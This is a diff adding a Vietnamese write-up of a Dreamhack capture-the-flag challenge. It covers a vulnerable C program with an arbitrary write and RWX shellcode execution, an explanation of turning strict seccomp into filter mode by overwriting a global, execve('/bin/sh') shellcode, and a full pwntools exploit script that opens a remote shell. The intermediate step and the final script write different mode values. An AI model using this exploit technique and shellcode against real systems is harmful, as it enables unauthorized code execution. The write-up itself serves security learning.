@@ -281,3 +281,206 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+# seccomp
+
+## source
+
+```c
+// gcc -o seccomp seccomp.cq
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <signal.h>
+#include <stddef.h>
+#include <sys/prctl.h>
+#include <linux/seccomp.h>
+#include <linux/filter.h>
+#include <linux/unistd.h>
+#include <linux/audit.h>
+#include <sys/mman.h>
+
+int mode = SECCOMP_MODE_STRICT;
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    signal(SIGALRM, alarm_handler);
+    alarm(60);
+}
+
+int syscall_filter() {
+    #define syscall_nr (offsetof(struct seccomp_data, nr))
+    #define arch_nr (offsetof(struct seccomp_data, arch))
+
+    /* architecture x86_64 */
+    #define REG_SYSCALL REG_RAX
+    #define ARCH_NR AUDIT_ARCH_X86_64
+    struct sock_filter filter[] = {
+        /* Validate architecture. */
+        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, arch_nr),
+        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, ARCH_NR, 1, 0),
+        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
+        /* Get system call number. */
+        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr),
+        };
+
+    struct sock_fprog prog = {
+    .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
+    .filter = filter,
+        };
+    if ( prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1 ) {
+        perror("prctl(PR_SET_NO_NEW_PRIVS)\n");
+        return -1;
+        }
+
+    if ( prctl(PR_SET_SECCOMP, mode, &prog) == -1 ) {
+        perror("Seccomp filter error\n");
+        return -1;
+        }
+    return 0;
+}
+
+
+int main(int argc, char* argv[])
+{
+    void (*sc)();
+    unsigned char *shellcode;
+    int cnt = 0;
+    int idx;
+    long addr;
+    long value;
+
+    initialize();
+
+    shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+    while(1) {
+        printf("1. Read shellcode\n");
+        printf("2. Execute shellcode\n");
+        printf("3. Write address\n");
+        printf("> ");
+
+        scanf("%d", &idx);
+
+        switch(idx) {
+            case 1:
+                if(cnt != 0) {
+                    exit(0);
+                }
+
+                syscall_filter();
+                printf("shellcode: ");
+                read(0, shellcode, 1024);
+                cnt++;
+                break;
+            case 2:
+                sc = (void *)shellcode;
+                sc();
+                break;
+            case 3:
+                printf("addr: ");
+                scanf("%ld", &addr);
+                printf("value: ");
+                scanf("%ld", addr);
+                break;
+            default:
+                break;
+        }
+    }
+    return 0;
+}
+```
+
+## Ý tưởng
+
+- Ở đây ta có kiến thức mới là `Seccomp Filter Bypass`
+- Seccomp là một cơ chế bảo mật trong Linux kernel cho phép hạn chế các hành động mà một quá trình có thể thực hiện bằng cách giới hạn các system call mà nó có thể gọi. Seccomp filter là một chương trình cấu hình để thiết lập các quy tắc để kiểm soát các system call mà một chương trình có thể gọi. => tạm hiểu là chế độ bảo vệ hạn chế một số các syscall
+- Trong seccomp có 2 chế độ là `STRICT_MODE` và
+  - Khi `STRICT_MODE` được kích hoạt, các system call sẽ bị giới hạn chỉ cho phép các system call cần thiết để chương trình hoạt động, đồng thời loại bỏ các system call không an toàn hoặc không cần thiết. Trong chương trình này, `STRICT_MODE` cho phép các syscall là `read, write, exit, sigreturn`
+  - `FILTER_MODE` trong seccomp là một chế độ bảo vệ tương tự như STRICT_MODE, nhưng nó cho phép người dùng tùy chỉnh danh sách các system call được phép hoạt động. Thông qua `prctl` và `sock_fprog`
+- Chức năng của chương trình là viết, thực thi shellcode và thay đổi giái trị của 1 địa chỉ
+- Ta thấy chương trình này có sử dụng `int mode = SECCOMP_MODE_STRICT;`
+- Vậy nếu ta đổi value của mode thành 2, nghĩa là chuyển từ chế độ `strict` sang `filter` thì có thể thực thi các syscall không được phép của `strict` (`filter` không gắt như `strict`)
+
+## Khai thác
+
+- Ta sẽ dùng chức năng 3 để thay đổi chế độ của seccomp
+
+```python
+SECCOMP_MODE_DISABLED = 0
+SECCOMP_MODE_STRICT = 1
+SECCOMP_MODE_FILTER = 2
+
+
+mode = 0x602090
+
+p.sendlineafter(b'> ',b'3')
+p.sendlineafter(b'addr: ', str(mode))
+p.sendlineafter(b'value: ',b'0')
+```
+
+- Và ta tạo shell, em sử dụng lại shell của bài `shell basic`
+
+```python
+shellcode = asm('''
+                    mov rax, 0x3b
+                    mov rdi, 29400045130965551
+                    push rdi
+
+                    mov rdi, rsp
+                    xor rsi, rsi
+                    xor rdx, rdx
+
+                    syscall
+                ''', arch = 'amd64')
+# ta có thể dùng pwntool
+# shellcode = asm(shellcraft.sh())
+```
+
+- Và chọn option 2
+
+## Kết quả
+
+![image](https://user-images.githubusercontent.com/111769169/231638343-b9ca57e2-2630-4dbe-988e-5960209032f5.png)
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+context.binary = exe = ELF('./seccomp',checksec=False)
+
+# p = process(exe.path)
+p = remote("host3.dreamhack.games", 23236)
+
+mode = 0x602090
+shellcode = asm('''
+                    mov rax, 0x3b
+                    mov rdi, 29400045130965551
+                    push rdi
+
+                    mov rdi, rsp
+                    xor rsi, rsi
+                    xor rdx, rdx
+
+                    syscall
+                ''', arch = 'amd64')
+
+p.sendlineafter(b'> ',b'3')
+p.sendlineafter(b'addr: ', str(mode))
+p.sendlineafter(b'value: ',b'2')
+
+p.sendlineafter(b'> ',b'1')
+p.sendafter(b'shellcode: ', shellcode)
+
+p.sendlineafter(b'> ',b'2')
+
+p.interactive()
+```
